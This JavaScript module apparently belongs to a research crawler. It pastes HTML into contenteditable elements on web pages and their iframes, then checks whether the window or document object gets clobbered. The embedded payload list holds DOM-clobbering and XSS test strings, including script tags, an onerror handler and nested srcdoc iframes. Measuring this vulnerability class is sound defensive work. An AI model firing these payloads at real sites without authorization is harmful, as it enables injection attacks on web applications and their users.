const fs = require('fs');
const path = require('path');

module.exports = {
  pasteContentEditableTestCb
};


/**
 * The callback function is used to test all the contenteditable elements on the page.
 * For contenteditable elements, we will paste the attack payload in 'type/html' format and 
 * check the window or document object to see if the payload can be lookuped.
 * 
 * This callback function will mimic the behavior of the attacker who tries to paste the
 * attack payload to the contenteditable element and check if id or name attribute can be 
 * persisted.
 * 
 * 
 * Limitation:
 * --------------------------------
 * 1/ The action cannot handle the alert/prompt/confirm dialog boxes that may be triggered
 * before or after the paste action. However, human can easily handle the dialog boxes. While 
 * this script cannot capture the results on the websites that need any user interactions. This
 * will lead to the false negative results.
 * 
 * @param {*} visitor
 * @param {*} page
 */
async function pasteContentEditableTestCb(visitor, page){
  
  // Step1. Prepare the clipboard with the attack payload
  await prepareClipboard(page, htmlPayload);

  // Step2. Get all contenteditable elements on the page
  let results = await verifyContentEditables(page, page);

  // Handle the editor within iframe 
  const frames = await page.frames();
  for (let frame of frames) {
    let new_results = await verifyContentEditables(page, frame);
    results = results.concat(new_results);
  }

  // If there are contenteditable elements
  if (results.length > 0) {
    // Save the contenteditable elements to the file
    fs.writeFileSync(path.join(visitor.webpageCrawlerFolder, "contentEditableElementsVerified.json"), 
        JSON.stringify(results, null, 4));
    
    // Any of the elements allow the clobbering of top level window or document object
    let topClobberableResult = {}; 
    topClobberableResult.topWindow = results.some(result => result.top_window);
    topClobberableResult.topDocument = results.some(result => result.top_document);
    updateContentEditableVerifiedMap(visitor, topClobberableResult, results.length);
  }
  
}

const isClobberable = async (context) => {
  let results = {
    window: false,
    document: false
  }

  const windowClobberable = await checkWindowClobberable(context);
  const documentClobberable = await checkDocumentClobberable(context);

  if (windowClobberable) { results.window = true; }
  if (documentClobberable) { results.document = true; }

  return results;
}

const checkWindowClobberable = async (context) => {
  return await context.evaluate(() => {
    return window.attack;
  });
}

const checkDocumentClobberable = async (context) => {
  return await context.evaluate(() => {
    return document.attack;
  });
}

/**
 * Simulate the paste action on the contenteditable element
 * 
 * @param {*} contentEditableElementHandle 
 */
async function simulatePaste(page) {
  await page.keyboard.down('Control');
  await page.keyboard.press('V');
  await page.keyboard.up('Control');
}


/**
 * Helper function to check all contenteditable elements on the page (iframe)
 * 
 * It will focus on each contenteditable element and paste the attack payload
 * Then, check if the window or document object has been clobbered
 * 
 * @param {*} page: the main page object
 * @param {*} context: could be the main page or the iframe
 * @param {*} startId 
 * @returns 
 */
async function verifyContentEditables(page, context) {

  let results = [];

  // Find all suitable contenteditable elements
  const elements = await context.$$eval("[contenteditable]", elements =>
    elements.filter(el => {
      const contenteditable = el.getAttribute("contenteditable");
      return contenteditable !== "false" && contenteditable !== "plaintext-only" &&
             el.tagName !== "INPUT" && el.tagName !== "TEXTAREA";
    }).map(el => el.tagName)
  );

  // Focus and paste in each element
  for (let i = 0; i < elements.length; i++) {
    // Focus the element using a selector or a more specific identification
    await context.focus(`[contenteditable]:nth-of-type(${i + 1})`);
    // Simulate user pasting operation
    await simulatePaste(page);
    
    // Check if the window or document object has been clobbered
    const frame_clobberable = await isClobberable(context);
    const top_clobberable = await isClobberable(page);

    if (frame_clobberable.window || frame_clobberable.document || 
        top_clobberable.window || top_clobberable.document) {
      results.push({
        id: `[contenteditable]:nth-of-type(${i + 1})`,
        frame_window: frame_clobberable.window,
        frame_document: frame_clobberable.document,
        top_window: top_clobberable.window,
        top_document: top_clobberable.document
      })
    }
  }

  return results;
}


/**
 * Helper function to update the overall map of contenteditable elements for sites.
 * 
 * @param {*} visitor The visitor object containing information about the current site.
 * @param {number} contentEditableNum The number of contenteditable elements found on the page.
 */
const updateContentEditableVerifiedMap = (visitor, topClobberableResult, contentEditableVerifedNum) => {
  const filePath = path.join(visitor.basedir, "..", "contentEditableEleSiteVerifiedMap.json");

  // Read existing data from the file, if it exists
  let data = [];
  if (fs.existsSync(filePath)) {
      data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
  }

  // Update the entry for the current URL
  data.push({
    id: data.length + 1,
    domain: visitor.domain,
    url: visitor.curURL,
    hash: visitor.curURLHash,
    contentEditableVerifiedNum: contentEditableVerifedNum,
    clobberable: topClobberableResult
  });

  // Write the updated data back to the file
  fs.writeFileSync(filePath, JSON.stringify(data, null, 4));
};


/**
 * Add the payload in html format to the clipboard
 * 
 * @param {*} page 
 * @param {*} htmlPayload 
 */
async function prepareClipboard(page, htmlPayload) {
  await page.click('body');
  await page.evaluate(async (htmlPayload) => {
    document.body.focus();
    const data = new Blob([htmlPayload], { type: 'text/html' });
    const clipboardItem = new ClipboardItem({ 'text/html': data });
    await navigator.clipboard.write([clipboardItem]);
  }, htmlPayload);
}


const htmlPayload = `
<image onerror=debugger; src=attack>
<img src=attack>

<a id="attack" href="b"></a>
<customtag id="attack"></customtag>
<article id="attack"></article>
<iframe name="attack"></iframe>
<base id="attack"></base>
<aside id="attack"></aside>
<audio id="attack"></audio>
<b id="attack"></b>

<embed name="attack" src="https://xxx.xxx.xxx/"></embed>
<img name="attack" src="https://xxx.xxx.xxx/"></img>
<object id="attack" data="https://xxx.xxx.xxx/"></object>
<form name="attack"></form> <form name="attack" id="src"></form>
<form name="attack"><img name="src" src="https://xxx.xxx.xxx/"></form>
<form name="attack"><output name="src"> https://xxx.xxx.xxx/ </output></form>
<object id=attack><img id="attack" name="src" src="https://xxx.xxx.xxx/" /></object>

<script>alert(2); console.trace();</script>
<script>console.trace(); alert(3)</script>

<a id="attack"></a><a id="attack" name="b" href="c"></a>
<form id="attack"><input id="b"/> </form>

<form id="attack"><button id="b"/> </button> </form>

<form id="attack"><img id="b" src="c" /> </form>

<form id="attack"> <form id="attack" name="b"> <input name="c" value="d"> </form>

<iframe name=window srcdoc=" <iframe name=attack srcdoc=&quot; <iframe name=b srcdoc=&amp;quot; <a id='c' href='d'></a> &amp;quot;></iframe> &quot;></iframe> "></iframe>

<form name="attack"><textarea name="b" /> </textarea> </form>
`;